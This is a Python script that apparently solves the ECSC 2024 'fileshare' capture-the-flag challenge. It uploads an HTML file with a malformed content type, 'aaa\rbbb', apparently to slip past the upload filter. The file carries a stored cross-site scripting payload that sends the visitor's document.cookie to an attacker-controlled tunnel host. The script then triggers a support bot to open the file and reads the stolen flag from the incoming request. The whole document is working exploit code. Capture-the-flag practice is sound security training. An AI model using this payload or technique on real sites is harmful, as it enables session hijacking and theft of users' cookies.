#!/usr/bin/env python3

import logging
import os
import requests
import tunnel
import urllib.parse
import re

logging.disable()

# For HTTP connection
URL = os.environ.get("URL", "https://fileshare.challs.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

with tunnel.open_http_tunnel(tls=True) as t:
    ngrok_url = f"https://{t.remote_host}:{t.remote_port}"

    payload = f'''
    <img id="img">
    <script>
        document.getElementById('img').src = '{ngrok_url}/cookie=' + document.cookie;
    </script>
    '''

    files = {
        'file': ('payload.html', payload, 'aaa\rbbb')
    }

    response = requests.post(URL + '/upload.php', files=files)

    assert 'has been uploaded' in response.text

    id = re.search(r'/download\.php\?id=(\w+)"', response.text)[1]

    response = requests.post(URL + '/support.php', data={'fileid': id, 'message': 'test'})
    assert 'Thank you, we are taking care of your problem!' in response.text

    _, path, _, _ = t.wait_request()
    t.send_response(200, {}, b'')

    assert 'flag' in path

    # url decode flag
    flag = urllib.parse.unquote(path)
    print(flag)
